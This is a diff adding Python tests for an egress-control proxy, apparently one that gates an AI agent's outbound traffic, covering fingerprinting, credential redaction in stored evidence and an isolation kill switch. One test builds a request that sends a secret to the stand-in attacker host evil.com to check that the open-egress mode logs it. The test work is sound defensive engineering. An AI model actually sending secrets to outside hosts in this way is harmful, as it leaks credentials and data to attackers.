@@ -89,3 +89,39 @@ def test_response_logged_as_ingress(env):
     gate.on_response(r.seq, 200, [("content-type", "application/json")], b'{"score":1}')
     e = _entries(tmp)[-1]
     assert (e.kind, e.seq) == ("ingress", 1)
+
+
+def test_allow_all_egress_forwards_unchanged_and_records_fingerprint(env):
+    gate, tmp = env
+    gate.policy = parse(POLICY + b"allow_all_egress: true\n")
+    assert gate.on_connect("evil.com").verdict == "allow"
+    body = b'{"note":"' + SECRET + b'"}'
+    r = gate.on_request("evil.com", "PUT", "/x?y=1", [("User-Agent", "curl")], body)
+    assert (r.verdict, r.reason, r.body, r.headers) == ("allow", "fingerprint", body, [("User-Agent", "curl")])
+    f = c.decode(_entries(tmp)[0].element)
+    assert (f[4], f[8], f[9]) == ("evil.com", "allow", "fingerprint")
+    assert evidence.get(tmp / "evidence", f[7]) == body
+
+
+def test_allow_all_egress_redacts_credentials_in_evidence(env):
+    gate, tmp = env
+    gate.policy = parse(POLICY + b"allow_all_egress: true\n")
+    hdrs = [("Authorization", "Bearer sk-secret"), ("Content-Type", "application/json")]
+    r = gate.on_request("api.deepseek.com", "POST", "/v1/tools", hdrs, b"{}")
+    assert r.verdict == "allow" and r.headers == hdrs                    # proxy forwards the real headers
+    f = c.decode(_entries(tmp)[0].element)
+    assert f[6] == c.headers_digest([("Authorization", "***"), ("Content-Type", "application/json")])
+    assert b"sk-secret" not in b"".join(p.read_bytes() for p in (tmp / "evidence").rglob("*") if p.is_file())
+
+
+def test_isolate_kill_switch_blocks_even_open_egress(env):
+    gate, tmp = env
+    gate.policy = parse(POLICY + b"allow_all_egress: true\n")
+    switch = [False]
+    gate.isolated = lambda: switch[0]
+    assert gate.on_request("evil.com", "GET", "/", [], b"").verdict == "allow"
+    switch[0] = True
+    assert gate.on_connect("evil.com").verdict == "block"
+    r = gate.on_request(HOST, "POST", PATH, [("Authorization", "Bearer x")], b'{"model":"small","count":1}')
+    assert (r.verdict, r.reason) == ("block", "isolated")
+    assert [c.decode(e.element)[9] for e in _entries(tmp)][-1] == "isolated"
